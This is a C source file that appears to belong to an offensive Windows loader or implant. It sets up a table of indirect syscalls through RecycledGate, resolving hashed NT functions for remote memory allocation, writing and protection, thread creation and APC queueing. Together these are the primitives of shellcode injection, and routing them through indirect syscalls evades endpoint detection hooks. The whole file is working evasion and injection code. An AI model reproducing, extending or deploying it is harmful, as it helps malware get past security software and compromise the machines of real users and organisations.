#include <windows.h>
#include "Defines2.h"
#include "typedef.h"

#ifdef USE_INDIRECT_SYSCALL

#include "RecycledGate.h"
#include "ApiWrapper.h"

// Global syscall table
SYSCALL_TABLE g_SyscallTable = { 0 };

BOOL InitSyscallTable()
{
    if (g_SyscallTable.bInitialized)
        return TRUE;
    
    BOOL bSuccess = TRUE;
    
#ifdef _DEBUG
    printf("[*] Initializing Syscall Table (Indirect Syscalls)\n");
#endif
    
    // Initialize each syscall entry
    if (getSyscall(H_FUNC_NTALLOCATEVIRTUALMEMORY, &g_SyscallTable.NtAllocateVirtualMemory) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtAllocateVirtualMemory\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTWRITEVIRTUALMEMORY, &g_SyscallTable.NtWriteVirtualMemory) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtWriteVirtualMemory\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTPROTECTVIRTUALMEMORY, &g_SyscallTable.NtProtectVirtualMemory) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtProtectVirtualMemory\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTCREATETHREADEX, &g_SyscallTable.NtCreateThreadEx) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtCreateThreadEx\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTQUEUEAPCTHREAD, &g_SyscallTable.NtQueueApcThread) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtQueueApcThread\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTRESUMETHREAD, &g_SyscallTable.NtResumeThread) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtResumeThread\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTWAITFORSINGLEOBJECT, &g_SyscallTable.NtWaitForSingleObject) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtWaitForSingleObject\n");
#endif
        bSuccess = FALSE;
    }
    
    if (getSyscall(H_FUNC_NTTERMINATEPROCESS, &g_SyscallTable.NtTerminateProcess) != SUCCESS) {
#ifdef _DEBUG
        printf("[!] Failed to resolve NtTerminateProcess\n");
#endif
        bSuccess = FALSE;
    }
    
    // Optional syscalls - don't fail if not found
    getSyscall(H_FUNC_NTOPENPROCESS, &g_SyscallTable.NtOpenProcess);
    getSyscall(H_FUNC_NTSUSPENDTHREAD, &g_SyscallTable.NtSuspendThread);
    getSyscall(H_FUNC_NTCLOSE, &g_SyscallTable.NtClose);
    
    g_SyscallTable.bInitialized = bSuccess;
    
#ifdef _DEBUG
    if (bSuccess)
        printf("[+] Syscall Table initialized successfully\n");
    else
        printf("[!] Syscall Table initialization failed\n");
#endif
    
    return bSuccess;
}

#endif // USE_INDIRECT_SYSCALL
